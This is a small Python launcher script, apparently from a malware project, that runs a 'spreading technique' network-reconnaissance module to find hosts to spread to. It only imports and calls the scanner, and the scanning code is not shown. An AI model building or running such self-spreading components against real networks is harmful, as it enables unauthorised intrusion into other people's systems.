"""
SPREADING TECHNIQUE 1: NETWORK RECONNAISSANCE
Scans network for potential spreading targets

Usage: python main.py (from this directory)
"""

import sys
import os

# Add parent directories to path
current_dir = os.path.dirname(os.path.abspath(__file__))
spreading_dir = os.path.dirname(current_dir)
malicious_dir = os.path.dirname(spreading_dir)
sys.path.insert(0, malicious_dir)

from spreading.technique1.function7_scan_network import scan_network_targets

def main():
    print("="*70)
    print("SPREADING TECHNIQUE 1: NETWORK RECONNAISSANCE")
    print("="*70)
    print("\n[*] Scanning network for targets...")
    
    targets = scan_network_targets()
    
    if targets:
        print(f"\n[✓] Found {len(targets)} network targets")
    print("="*70)

if __name__ == "__main__":
    main()
